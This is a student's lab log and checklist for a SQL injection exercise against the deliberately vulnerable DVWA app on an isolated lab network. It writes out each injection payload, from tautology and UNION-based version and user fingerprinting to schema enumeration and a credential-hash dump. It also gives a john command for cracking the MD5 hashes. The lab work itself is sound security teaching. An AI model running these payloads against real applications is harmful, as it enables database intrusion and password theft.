# Lab 3 — SQL Injection Execution Log & Deliverables Checklist

> **Student ID**: 2301563  
> **Module**: Computer Security — Lab 3: SQL Injection (SQLi) with DVWA  
> **Environment**: Isolated VirtualBox (`LabNet` `192.168.100.0/24` / Local Kali DVWA Instance)

---

## 1. Lab Environment & DVWA Deployment Record

| Component | Machine / Service | IP / Target URL | Configured & Verified? |
| :--- | :--- | :--- | :---: |
| **Attacker Browser** | Kali Linux (`kali-linux-2026.3` — Firefox ESR) | `192.168.100.3` | [ ] |
| **DVWA Target** | Kali `dvwa` (`:42001`) *or* Ubuntu 22.04 LAMP (`tamai-ubuserv-compsec-lab`) | `http://_______________` | [ ] |
| **Database Initialized** | `setup.php` $\rightarrow$ **Create / Reset Database** | MariaDB / MySQL (`dvwa` schema) | [ ] |
| **DVWA Security Level** | **DVWA Security** $\rightarrow$ **`Low`** (PHPIDS: `disabled`) | Verified in bottom-left footer | [ ] |
| **Pre-Lab Snapshot** | VirtualBox Snapshot (`Pre-Lab3-DVWA-Ready`) | Saved on `D:\VMs\VirtualBox` | [ ] |

---

## 2. Step-by-Step SQL Injection Payload & Observation Log

Record your exact observed outputs from DVWA as you execute each stage:

| Step | Goal | Exact Payload Entered in `User ID` | Observed Output / Notes |
| :---: | :--- | :--- | :--- |
| **1** | Parameter Discovery | `1` *(then URL `?id=2`, `?id=3`, `?id=4`, `?id=5`)* | `ID: 1` $\rightarrow$ `admin / admin`; URL parameter `id` confirmed injectable |
| **2** | Boolean Tautology | `%' or '0'='0` *(or `%' or '1'='1`)* | Returned all ___ user records in a single query |
| **3** | DB Version Fingerprint | `%' or 0=0 union select null, version() #` | DB Version: `___________________________` |
| **4** | Active DB User | `%' or 0=0 union select null, user() #` | DB User: `______________________________` |
| **5** | All Schema Tables | `%' and 1=0 union select null, table_name from information_schema.tables #` | Listed system metadata tables + `guestbook`, `users` |
| **6** | Filter `user%` Tables | `%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#` | Matched tables: `_______________________` |
| **7** | Credential Hash Dump | `%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #` | Exfiltrated all 5 accounts & MD5 hashes (logged below) |
| **8** *(Bonus)* | Crack MD5s (`john`) | `john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt dvwa_hashes.txt` | Cracked ___ / 5 hashes in ___ s |

---

## 3. Exfiltrated `users` Table Credentials (Step 7)

| `user_id` | `first_name` | `last_name` | `user` | Extracted MD5 Hash (`password`) | Cracked Plaintext *(Optional)* |
| :---: | :--- | :--- | :--- | :--- | :--- |
| `1` | `admin` | `admin` | `admin` | `5f4dcc3b5aa765d61d8327deb882cf99` | |
| `2` | `Gordon` | `Brown` | `gordonb` | `e99a18c428cb38d5f260853678922e03` | |
| `3` | `Hack` | `Me` | `1337` | `8d3533d75ae2c3966d7e0d4fcc69216b` | |
| `4` | `Pablo` | `Picasso` | `pablo` | `0d107d09f5bbe40cade3de5c71e9e9b7` | |
| `5` | `Bob` | `Smith` | `smithy` | `5f4dcc3b5aa765d61d8327deb882cf99` | |

---

## 4. Screenshots Checklist

Save all screenshots into `Labs/Lab3/Deliverables/` as you complete each step:

- [ ] `00_dvwa_security_low.png` — **DVWA Security** page confirming `Security Level is currently: low` and PHPIDS disabled.
- [ ] `01_step1_basic_parameter_discovery.png` — Step 1 baseline query (`ID: 1` and/or URL `?id=2`, `?id=3`, `?id=4` records).
- [ ] `02_step2_tautology_all_users.png` — Step 2 boolean tautology (`%' or '0'='0`) returning all 5 users at once.
- [ ] `03_step3_db_version.png` — Step 3 `UNION SELECT null, version() #` revealing the MariaDB/MySQL engine version.
- [ ] `04_step4_db_user.png` — Step 4 `UNION SELECT null, user() #` revealing the backend database user (`dvwa@localhost` / `root@localhost`).
- [ ] `05_step5_information_schema_tables.png` — Step 5 `information_schema.tables` enumeration with original rows suppressed (`and 1=0`).
- [ ] `06_step6_filtered_user_tables.png` — Step 6 `WHERE table_name LIKE 'user%'` filtering down to `USER_PRIVILEGES` and `users`.
- [ ] `07_step7_dumped_credentials_hashes.png` — Step 7 `concat(...)` full dump displaying usernames and MD5 password hashes.
- [ ] `08_bonus_john_md5_cracked.png` *(Optional)* — Kali terminal cracking the 5 dumped MD5 hashes with `john --format=raw-md5`.

---

## 5. Report Link (Once Submitted)

- Google Doc / Report URL: *(paste link here once drafted, matching Lab 1 & Lab 2 convention)*
